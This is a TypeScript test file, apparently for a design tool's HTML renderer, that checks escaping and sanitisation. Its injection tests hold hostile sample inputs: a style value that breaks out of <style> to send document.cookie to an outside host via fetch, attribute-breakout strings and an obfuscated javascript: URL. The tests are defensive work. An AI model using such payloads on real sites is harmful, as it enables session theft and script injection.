import { describe, expect, it } from 'vitest'
import type { DesignArtboard, DesignNode } from '../types/design'
import {
  buildArtboardDocument,
  fontsToLinks,
  renderNode,
  renderStandaloneHtml,
  tokensToCss,
} from './html-render'

const node = (partial: Partial<DesignNode> & { id: string; tag: string }): DesignNode => ({
  kind: 'element',
  style: {},
  attrs: {},
  children: [],
  ...partial,
})

const artboard = (tree: DesignNode): DesignArtboard => ({
  id: 'ab1',
  pageId: 'p1',
  name: 'Home',
  x: 0,
  y: 0,
  width: 1440,
  height: 900,
  tree,
  version: 1,
  position: 0,
  createdAt: 0,
  updatedAt: 0,
})

describe('renderNode', () => {
  it('escapa texto e atributos, serializa style em kebab', () => {
    const html = renderNode(
      node({
        id: 'a',
        tag: 'a',
        kind: 'text',
        text: '<b>&"x"</b>',
        attrs: { href: '/x?a=1&b="2"', title: '<t>' },
        style: { backgroundColor: 'red', '--gap': '4px', 'font-size': '12px' },
      }),
    )
    expect(html).toBe(
      '<a href="/x?a=1&amp;b=&quot;2&quot;" title="&lt;t&gt;" style="background-color:red;--gap:4px;font-size:12px" data-pw-id="a">&lt;b&gt;&amp;"x"&lt;/b&gt;</a>',
    )
  })

  it('void elements não fecham; tag é normalizada para minúsculas', () => {
    expect(renderNode(node({ id: 'i', tag: 'IMG', kind: 'image', attrs: { src: 'x.png' } }))).toBe(
      '<img src="x.png" data-pw-id="i">',
    )
    expect(renderNode(node({ id: 'b', tag: 'br' }))).toBe('<br data-pw-id="b">')
  })

  it('subárvore svg preserva case de tags e atributos', () => {
    const svg = node({
      id: 's',
      tag: 'svg',
      kind: 'svg',
      attrs: { viewBox: '0 0 10 10' },
      children: [
        node({
          id: 'g',
          tag: 'linearGradient',
          children: [node({ id: 'p', tag: 'path', attrs: { d: 'M0 0' } })],
        }),
      ],
    })
    expect(renderNode(svg)).toBe(
      '<svg viewBox="0 0 10 10" data-pw-id="s"><linearGradient data-pw-id="g"><path d="M0 0" data-pw-id="p"></path></linearGradient></svg>',
    )
  })

  it('hidden: data-pw-hidden + display:none sem tocar node.style', () => {
    const n = node({ id: 'h', tag: 'div', kind: 'frame', hidden: true, style: { display: 'flex' } })
    const html = renderNode(n)
    expect(html).toContain('data-pw-hidden=""')
    expect(html).toContain('style="display:flex;display:none !important"')
    expect(n.style).toEqual({ display: 'flex' })
    expect(renderNode(n, { ids: false })).toBe('')
  })

  it('descarta tags perigosas, handlers on* e urls javascript:', () => {
    const tree = node({
      id: 'r',
      tag: 'div',
      attrs: {
        onclick: 'x()',
        href: 'javascript:alert(1)',
        'data-pw-id': 'spoof',
        'bad name': '1',
      },
      children: [node({ id: 'x', tag: 'script', text: 'alert(1)' })],
    })
    expect(renderNode(tree)).toBe('<div data-pw-id="r"></div>')
  })

  it('link vira data-pw-link/transition só no modo com ids', () => {
    const n = node({ id: 'l', tag: 'button', link: { artboardId: 'ab2', transition: 'push' } })
    expect(renderNode(n)).toContain('data-pw-link="ab2" data-pw-transition="push"')
    expect(renderNode(n, { ids: false })).toBe('<button></button>')
  })
})

describe('tokensToCss / fontsToLinks', () => {
  it('gera variáveis por categoria e vazio quando não há tokens', () => {
    expect(tokensToCss({ color: { primary: '#111' }, spacing: { md: '8px' }, radius: {} })).toBe(
      ':root{--color-primary:#111;--spacing-md:8px}',
    )
    expect(tokensToCss({})).toBe('')
  })

  it('só aceita stylesheets do Google Fonts', () => {
    expect(
      fontsToLinks([
        'https://fonts.googleapis.com/css2?family=Inter&display=swap',
        'https://evil.example/x.css',
      ]),
    ).toBe(
      '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter&amp;display=swap">',
    )
  })
})

describe('buildArtboardDocument', () => {
  const doc = {
    tokens: { color: { bg: '#fff' } },
    fonts: [],
    globalCss: 'p{margin:0}</style><script>',
  }
  const tree = node({
    id: 'root',
    tag: 'div',
    kind: 'frame',
    style: { background: '#eee' },
    children: [node({ id: 't', tag: 'p', kind: 'text', text: 'hi' })],
  })

  it('monta o documento completo com nonce, tokens, css global escapado e tamanho do artboard', () => {
    const html = buildArtboardDocument({
      doc,
      artboard: artboard(tree),
      runtimeJs: 'console.log(1)',
      nonce: 'N0nce',
      mode: 'edit',
    })
    expect(
      html.startsWith('<!doctype html><html data-pw-mode="edit"><head><meta charset="utf-8">'),
    ).toBe(true)
    expect(html).toContain('<script nonce="N0nce">console.log(1)</script>')
    expect(html).toContain(':root{--color-bg:#fff}p{margin:0}<\\/style><script>')
    expect(html).toContain('body{width:1440px;height:900px;overflow:hidden;background:#eee}')
    expect(html).toContain(
      '<body data-pw-artboard="ab1"><div style="background:#eee" data-pw-id="root"><p data-pw-id="t">hi</p></div>',
    )
  })

  it('mode shot não injeta o runtime', () => {
    const html = buildArtboardDocument({
      doc,
      artboard: artboard(tree),
      runtimeJs: 'x',
      nonce: 'n',
      mode: 'shot',
    })
    expect(html).not.toContain('<script nonce')
  })

  it('standalone: sem runtime nem data-pw-id', () => {
    const html = renderStandaloneHtml(doc, artboard(tree))
    expect(html).not.toContain('data-pw-')
    expect(html).not.toContain('<script nonce')
    expect(html).toContain('<title>Home</title>')
    expect(html).toContain('<div style="background:#eee"><p>hi</p></div>')
  })
})

describe('baseCss / link attrs — injection', () => {
  const doc = { tokens: {}, fonts: [], globalCss: '' }

  it('a root background that could close <style> falls back to white in both renderers', () => {
    const evil = "red}</style><script>fetch('https://x/?'+document.cookie)</script><style>"
    const tree = node({ id: 'root', tag: 'div', kind: 'frame', style: { background: evil } })
    const standalone = renderStandaloneHtml(doc, artboard(tree))
    const inApp = buildArtboardDocument({
      doc,
      artboard: artboard(tree),
      runtimeJs: '',
      nonce: 'n',
      mode: 'edit',
    })
    for (const html of [standalone, inApp]) {
      expect(html).not.toContain('<script>fetch')
      expect(html).toContain('overflow:hidden;background:#ffffff}')
    }
    // The root element itself still carries the value, attribute-escaped.
    expect(standalone).toContain('style="background:red}&lt;/style&gt;&lt;script&gt;')
  })

  it('width/height are coerced to integers before reaching CSS', () => {
    const tree = node({ id: 'root', tag: 'div', kind: 'frame' })
    const ab = { ...artboard(tree), width: '10px}</style>' as unknown as number, height: 12.6 }
    const html = renderStandaloneHtml(doc, ab)
    expect(html).toContain('body{width:0px;height:13px;')
    expect(html).toContain('<meta name="viewport" content="width=0">')
  })

  it('link transition is validated and the artboard id attribute-escaped', () => {
    const n = node({
      id: 'l',
      tag: 'button',
      link: { artboardId: 'x"><img src=x>', transition: '"><b class="' as never },
    })
    expect(renderNode(n)).toBe(
      '<button data-pw-id="l" data-pw-link="x&quot;&gt;&lt;img src=x&gt;" data-pw-transition="none"></button>',
    )
  })

  it('data-pw-link attrs on a node are never rendered (only node.link counts)', () => {
    const n = node({
      id: 'l',
      tag: 'a',
      attrs: { 'data-pw-link': 'ab2', 'data-pw-transition': 'push' },
    })
    expect(renderNode(n)).toBe('<a data-pw-id="l"></a>')
  })

  it('url allowlist: obfuscated javascript and data:text are out, data:image and https stay', () => {
    const n = node({
      id: 'u',
      tag: 'a',
      attrs: {
        href: 'java\tscript:alert(1)',
        src: 'data:image/png;base64,AA==',
        action: 'https://x',
      },
    })
    expect(renderNode(n)).toBe(
      '<a src="data:image/png;base64,AA==" action="https://x" data-pw-id="u"></a>',
    )
  })
})
